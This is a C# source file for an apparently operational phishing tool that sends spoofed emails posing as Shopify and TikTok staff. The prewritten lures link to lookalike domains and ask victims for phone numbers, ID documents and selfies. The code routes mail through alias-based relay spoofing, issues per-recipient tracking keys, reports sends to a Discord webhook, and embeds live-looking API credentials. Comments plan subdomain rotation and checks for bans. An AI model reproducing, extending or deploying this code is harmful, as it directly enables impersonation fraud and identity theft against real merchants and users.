using System;
using System.IO;
using System.Xml;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Text.Json;
using System.Collections.Generic;

/*
    Features to implement:
    - auto switching between phishing subdomains - DONE 07/27
    - monitoring whether site is banned or not before sending emails, if so, warn in discord and console, then cancel sending
    - multiple sender domains, maybe distribute, diff for every recipient
*/

class Sender
{
    static void Main()
    {
        Console.WriteLine("Mail v2.4, build: 08/05 6:42 AM");

        while (true)
        {
            MailMenu();
        }
    }

    private static void MailMenu()
    {
        Console.WriteLine();
        Console.WriteLine("[100] [Shopify] Custom.");
        Console.WriteLine("[101] [Shopify] Verify phone.");
        Console.WriteLine("[102] [Shopify] Verify phone successful.");

        Console.WriteLine();
        Console.WriteLine("[200] [TikTok] Custom.");
        Console.WriteLine("[201] [TikTok] Verified badge.");
        Console.WriteLine("[202] [TikTok] Provide ID.");
        Console.WriteLine("[203] [TikTok] Repeat ID.");
        Console.WriteLine();

        Console.Write("Type: ");

        if (int.TryParse(Console.ReadLine(), out int type))
        {
            Console.Write("Recipient: ");
            HandleMessage(type, Console.ReadLine());
        }
    }

    private static void HandleMessage(int type, string recipient)
    {
        MessageBuilder builder = new MessageBuilder()
        {
            Name = Generator.GetRandomName(),
            Date = DateTime.UtcNow.ToString(),
            Recipient = recipient
        };

        /* Shopify options */
        if (type >= 100 && type <= 199)
        {
            builder.Team = "Risk Operations";
            builder.Role = "Risk Analyst";
            builder.Sender = "Shopify <shopify@support.com>";
        }

        /* TikTok options */
        if (type >= 200 && type <= 299)
        {
            builder.Team = "User Management";
            builder.Role = "User Management";
            builder.Sender = "TikTok <tiktok@support.com>";
        }

        /* Custom messages */
        if (type == 100 || type == 200)
        {
            Console.Write("Subject: ");
            builder.Subject = Console.ReadLine();

            Console.WriteLine("Enter up to 10 lines of text. Leave empty to exit.");

            for (int i = 1; i <= 10; i++)
            {
                Console.Write("Line {0}: ", i);
                string line = Console.ReadLine();

                if (!string.IsNullOrWhiteSpace(line))
                {
                    builder.WriteLine(line);
                }
                else
                {
                    break;
                }
            }
        }

        /* Shopify: Verify phone */
        if (type == 101)
        {
            builder.Subject = "Regarding your account";
            builder.WriteLine("This is {0} from the Risk Operations team, we're reaching out to you in regards to your account. I was assigned to be your point of contact regarding this matter, so do not hesitate to let me know if you have any questions and I'll get back to you shortly.", builder.Name);
            builder.WriteLine("One or more of your stores that your account holds ownership for were marked as needing additional inspection due to higher than average risk score for customer disputes, which we're trying to prevent in all possible ways. From what I can see, we still don't have your phone number on file, therefore I'm asking you to provide us your phone number, so we can be able to reach out to you if any issues arise in the future.");
            builder.WriteLine("Not providing your phone number may lead to temporary service suspension, which means you'll be unable to accept any payments (excluding those made with off-site gateways) until you provide us your phone number. You may update your phone number in your dashboard, or by going to the link below.");
            builder.WriteLine("https://{0}/sw/phone-number?id={1}", Generator.GetRandomShopifyDomain(), AccessKeys.Create(builder.Recipient));
            builder.WriteLine("Please note that your phone number will not be publicly visible to your customers, and if we need to reach out to you, we'll be doing so at your local day time during business days, however if you prefer to use specific time ranges, please let us know.");
        }

        /* Shopify: Verify phone successful */
        if (type == 102)
        {
            builder.Subject = "Regarding your account";
            builder.WriteLine("This is {0} from the Risk Management team. I appreciate your inquiry, from what I see, you have successfully updated and confirmed your phone number, and your account is no longer marked as needing additional review. As mentioned in the previous email, if any issues arise in the future, we'll use the phone number you've provided to reach out to you.", builder.Name);
            builder.WriteLine("If you'll have any other questions, do not hesitate to reply to this email and I'll do my best to get back to you as soon as possible. We wish you the best of luck with your business.");
        }

        /* TikTok: Verified badge */
        if (type == 201)
        {
            // TODO: Rewrite the message
            builder.Subject = "Regarding your request";
            builder.WriteLine("This is {0} from the Risk Management team. We are reaching out to you in regards to the verification request you submitted earlier inside the mobile app. We have reviewed your account and noticed that we need additional information before we can forward your request to the appropriate team. We request you to submit the following information.", builder.Name);
            builder.WriteLine("• Basic information about yourself such as full name, phone number, country of residence.");
            builder.WriteLine("• Basic information about your content, partnerships with brands & businesses and any other details you'd like us to know.");
            builder.WriteLine("If this is something you're not interested in anymore, you may disregard this email, otherwise the information can be submitted by going to the link below.");
            builder.WriteLine("https://{0}/tw/badge-request?id={1}", Generator.GetRandomTikTokDomain(), AccessKeys.Create(builder.Recipient));
        }

        /* TikTok: Provide ID */
        if (type == 202) 
        {
            // TODO: Rewrite the message
            builder.Subject = "Regarding your request";
            builder.WriteLine("{0} from the User Management Team. I am following up on the verified badge request that you've submitted earlier. We've reviewed your account and the provided information, however we found one or more similar users on our platform. In order to make sure that you're not impersonating someone else, we'll you to provide the following information.", builder.Name);
            builder.WriteLine("• Front & back pictures of your ID card, driver's license or passport.");
            builder.WriteLine("• Selfie of yourself holding the preferred document.");
            builder.WriteLine("• Contact phone number, if not yet provided in account settings.");
            builder.WriteLine("Please make sure that the documents are not blurry, damaged or hard to read, otherwise we may ask you to repeat this step. If this is something you're not interested in anymore, you may disregard this email.");
        }

        /* TikTok: Repeat ID */
        if (type == 203)
        {
            // TODO: Rewrite the message
            builder.Subject = "Regarding your request";
            builder.WriteLine("{0} from the User Management Team. Our team has reviewed the documents you provided earlier, however the documents were blurry, damaged, hard to read or invalid, therefore we're asking you to submit the following information again.", builder.Name);
            builder.WriteLine("• Front & back pictures of your ID card, driver's license or passport.");
            builder.WriteLine("• Selfie of yourself holding the preferred document.");
            builder.WriteLine("Please make sure that the documents are not blurry, damaged or hard to read, otherwise we may ask you to repeat this step. If this is something you're not interested in anymore, you may disregard this email.");
        }  

        /* Confirmation */
        if (builder.Lines.Count > 0)
        {
            if (File.Exists("./preview.html"))
            {
                Console.WriteLine("Preview file has been updated.");
                File.WriteAllText("./preview.html", builder.Build());
            }

            Console.Write("Confirm send? [Y/N]: ");

            if (Console.ReadLine().ToUpper() == "Y")
            {
                builder.Send(type);
            }
        }
        else
        {
            Console.WriteLine("Empty message will not be sent.");
        }
    }
}

class RelayServer
{
    private static readonly string Domain = "customer-control.com";
    private static readonly string Authorization = "Basic api:sk_ba4bdbbb5e7b432095492b0a3c5b291b";

    private static void CreateAlias(string alias, string forward)
    {
        try
        {
            string url = string.Format("https://api.improvmx.com/v3/domains/{0}/aliases/", Domain);
            HttpWebRequest request = WebRequest.CreateHttp(url);

            request.Method = "POST";
            request.Headers.Add(HttpRequestHeader.Accept, "application/json");
            request.Headers.Add(HttpRequestHeader.ContentType, "application/json");
            request.Headers.Add(HttpRequestHeader.Authorization, Authorization);

            using (Utf8JsonWriter writer = new Utf8JsonWriter(request.GetRequestStream()))
            {
                writer.WriteStartObject();
                writer.WriteString("alias", alias);
                writer.WriteString("forward", forward);
                writer.WriteEndObject();
            }

            request.GetResponse();
            Console.WriteLine("[SUCCESS] Alias '{0}' was created.", alias);
        }
        catch (WebException exception)
        {
            Console.WriteLine("[FAILED] Alias '{0}' couldn't be created. {1}", alias, exception.Message);
        }
    }

    private static void DeleteAlias(string alias)
    {
        try
        {
            string url = string.Format("https://api.improvmx.com/v3/domains/{0}/aliases/{1}", Domain, alias);
            HttpWebRequest request = WebRequest.CreateHttp(url);

            request.Method = "DELETE";
            request.Headers.Add(HttpRequestHeader.Accept, "application/json");
            request.Headers.Add(HttpRequestHeader.ContentType, "application/json");
            request.Headers.Add(HttpRequestHeader.Authorization, Authorization);

            using (Utf8JsonWriter writer = new Utf8JsonWriter(request.GetRequestStream()))
            {
                writer.WriteStartObject();
                writer.WriteEndObject();
            }

            request.GetResponse();
            Console.WriteLine("[SUCCESS] Alias '{0}' was deleted.", alias);
        }
        catch (WebException exception)
        {
            Console.WriteLine("[FAILED] Alias '{0}' couldn't be deleted. {1}", alias, exception.Message);
        }
    }

    private static bool SendMail(string from, string to, string subject, string body)
    {
        try
        {
            using (SmtpClient client = new SmtpClient())
            {
                client.Host = "mx1.improvmx.com";
                client.Port = 25;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.EnableSsl = false;

                using (MailMessage message = new MailMessage(from, to, subject, body))
                {
                    message.ReplyToList.Add(string.Format("replies@{0}", Domain));
                    message.IsBodyHtml = true;

                    client.Send(message);
                }
            }

            Console.WriteLine("[SUCCESS] Mail from '{0}' to '{1}' was delivered.", from, to);
            return true;
        }
        catch (SmtpException exception)
        {
            Console.WriteLine("[FAILED] Mail from '{0}' to '{1}' couldn't be delivered. {2}", from, to, exception);
            return false;
        }
    }

    public static void Spoof(int type, string from, string to, string subject, string body)
    {
        try
        {
            string user = to.Split("@")[0];
            string alias = string.Format("{0}@{1}", user, Domain);

            CreateAlias(user, to);

            while (true)
            {
                if (!SendMail(from, alias, subject, body))
                {
                    Discord.SendMessage(":warning: Email ``{0}`` from ``{1}`` couldn't be sent to ``{2}``.", type, from, to);
                    Console.Write("Attempt resend? [Y/N]: ");

                    if (Console.ReadLine().ToUpper() != "Y")
                    {
                        break;
                    }
                }
                else
                {
                    Discord.SendMessage(":white_check_mark: Email ``{0}`` from ``{1}`` sent to ``{2}``.", type, from, to);
                    break;
                }
            }

            DeleteAlias(user);
        }
        catch (Exception exception)
        {
            Console.WriteLine(exception.Message);
        }
    }
}

class Generator
{
    private static readonly Random Randomizer = new Random();

    private static readonly string[] ShopifyDomains = new string[]
    {
        "profile.shopify.reviews",
        "profiles.shopify.reviews",
        "request.shopify.reviews",
        "requests.shopify.reviews"
    };

    private static readonly string[] TikTokDomains = new string[]
    {
        "profile.tiktok.gdn",
        "profiles.tiktok.gdn",
        "request.tiktok.gdn",
        "requests.tiktok.gdn" 
    };

    private static readonly string[] Names = new string[]
    {
        "Catriona",
        "Taylor",
        "Louis",
        "Joseph",
        "William",
        "Sophia",
        "Mike",
        "Liam",
        "Oliver",
        "Olivia",
        "Emma",
        "Charlotte"
    };

    public static string GetRandomName()
    {
        return Names[Randomizer.Next(Names.Length)];
    }

    public static string GetRandomShopifyDomain()
    {
        return ShopifyDomains[Randomizer.Next(ShopifyDomains.Length)];
    }

    public static string GetRandomTikTokDomain()
    {
        return TikTokDomains[Randomizer.Next(TikTokDomains.Length)];
    }
}

class AccessKeys
{
    private static readonly string Hostname = "access-keys.kalobu.workers.dev";
    private static readonly string Password = "6d26223b";

    public static string Create(string user) 
    {
        try
        {
            string url = string.Format("https://{0}/access-keys/create?password={1}&user={2}", Hostname, Password, user);
            HttpWebRequest request = WebRequest.CreateHttp(url);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;

            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }
        catch (Exception)
        {
            return string.Empty;
        }
    }

//         public static bool Lookup(string id)
//         {
//             try
//             {
//                 string url = string.Format("https://{0}/access-keys/lookup?password={1}&id={2}", Hostname, Password, id);
//                 HttpWebRequest request = WebRequest.CreateHttp(url);
//                 HttpWebResponse response = request.GetResponse() as HttpWebResponse;

//                 using (StreamReader reader = new StreamReader(response.GetResponseStream()))
//                 {
//                     return string.IsNullOrWhiteSpace(reader.ReadToEnd()).Equals(false);
//                 }
//             }
//             catch (Exception)
//             {
//                 return false;
//             }
//         }

//         public static bool Revoke(string id)
//         {
//             try
//             {
//                 string url = string.Format("https://{0}/access-keys/revoke?password={1}&id={2}", Hostname, Password, id);
//                 HttpWebRequest request = WebRequest.CreateHttp(url);
//                 HttpWebResponse response = request.GetResponse() as HttpWebResponse;

//                 using (StreamReader reader = new StreamReader(response.GetResponseStream()))
//                 {
//                     return string.IsNullOrWhiteSpace(reader.ReadToEnd()).Equals(false);
//                 }
//             }
//             catch (Exception)
//             {
//                 return false;
//             }
//         }
}

class Discord
{
    private static readonly string Channel = "https://discord.com/api/webhooks/866327341755924511/QRmvvuHbLMR8B2mAYgZS8BEf_ph5SHv8Ah06slrLQU65kI7_jppXZklxDRauTKYWD4lY";

    public static void SendMessage(string content, params object[] arguments)
    {
        try
        {
            HttpWebRequest request = WebRequest.CreateHttp(Channel);

            request.Method = "POST";
            request.Headers.Add("Accept", "application/json");
            request.Headers.Add("Content-Type", "application/json");

            using (Utf8JsonWriter writer = new Utf8JsonWriter(request.GetRequestStream()))
            {
                writer.WriteStartObject();
                writer.WriteString("content", string.Format(content, arguments));
                writer.WriteEndObject();
            }

            request.GetResponse();
        }
        catch (Exception exception) 
        {
            Console.WriteLine(exception);
        }  
    }
}

class MessageBuilder
{
    public readonly List<string> Lines = new List<string>();

    public string Name = string.Empty;
    public string Date = string.Empty;
    public string Team = string.Empty;
    public string Role = string.Empty;

    public string Sender = string.Empty;
    public string Recipient = string.Empty;
    public string Subject = string.Empty;

    public void WriteLine(string content, params object[] arguments)
    {
        Lines.Add(string.Format(content, arguments));
    }

    public void Send(int type)
    {
        RelayServer.Spoof(type, Sender, Recipient, Subject, Build());
    }

    public string Build()
    {
        using (MemoryStream stream = new MemoryStream())
        {
            XmlWriterSettings settings = new XmlWriterSettings()
            {
                Encoding = new UTF8Encoding(false),
                OmitXmlDeclaration = true
            };

            using (XmlWriter writer = XmlWriter.Create(stream, settings))
            {
                /* Container & Line */
                writer.WriteStartElement("div");
                writer.WriteElementString("br", string.Empty);
                writer.WriteElementString("br", string.Empty);
                writer.WriteElementString("hr", string.Empty);

                /* Name & Team */
                writer.WriteStartElement("p");
                writer.WriteAttributeString("dir", "ltr");
                writer.WriteAttributeString("style", "font-family:'Lucida Grande','Lucida Sans Unicode','Lucida Sans',Verdana,Tahoma,sans-serif;font-size:15px;line-height:18px;margin-bottom:0;margin-top:0;padding:0;color:#1b1d1e");
                writer.WriteElementString("strong", Name);
                writer.WriteString(string.Format(" ({0})", Team));
                writer.WriteEndElement();

                /* Date */
                writer.WriteStartElement("p");
                writer.WriteAttributeString("dir", "ltr");
                writer.WriteAttributeString("style", "font-family:'Lucida Grande','Lucida Sans Unicode','Lucida Sans',Verdana,Tahoma,sans-serif;font-size:13px;line-height:25px;margin-bottom:15px;margin-top:0;padding:0;color:#bbbbbb");
                writer.WriteString(Date);
                writer.WriteEndElement();

                /* Message Container */
                writer.WriteStartElement("div");
                writer.WriteAttributeString("dir", "auto");
                writer.WriteAttributeString("style", "color:#2b2e2f;font-family:'Lucida Sans Unicode','Lucida Grande','Tahoma',Verdana,sans-serif;font-size:14px;line-height:22px;margin:15px 0");

                /* Greeting */
                writer.WriteStartElement("p");
                writer.WriteAttributeString("dir", "ltr");
                writer.WriteAttributeString("style", "color:#2b2e2f;font-family:'Lucida Sans Unicode','Lucida Grande','Tahoma',Verdana,sans-serif;font-size:14px;line-height:22px;margin:15px 0");
                writer.WriteString("Hello,");
                writer.WriteEndElement();

                /* Lines */
                foreach (string line in Lines.ToArray())
                {
                    writer.WriteStartElement("p");
                    writer.WriteAttributeString("dir", "ltr");
                    writer.WriteAttributeString("style", "color:#2b2e2f;font-family:'Lucida Sans Unicode','Lucida Grande','Tahoma',Verdana,sans-serif;font-size:14px;line-height:22px;margin:15px 0");
                    writer.WriteString(line);
                    writer.WriteEndElement();
                }

                /* Greeting */
                writer.WriteStartElement("p");
                writer.WriteAttributeString("dir", "ltr");
                writer.WriteAttributeString("style", "color:#2b2e2f;font-family:'Lucida Sans Unicode','Lucida Grande','Tahoma',Verdana,sans-serif;font-size:14px;line-height:22px;margin:15px 0");
                writer.WriteString("Have a nice day,");
                writer.WriteElementString("br", string.Empty);
                writer.WriteString(Name);
                writer.WriteElementString("br", string.Empty);
                writer.WriteString(Role);
                writer.WriteEndElement();

                /* End root & message container */
                writer.WriteEndElement();
                writer.WriteEndElement();
            }

            return Encoding.UTF8.GetString(stream.ToArray());
        }
    }
}
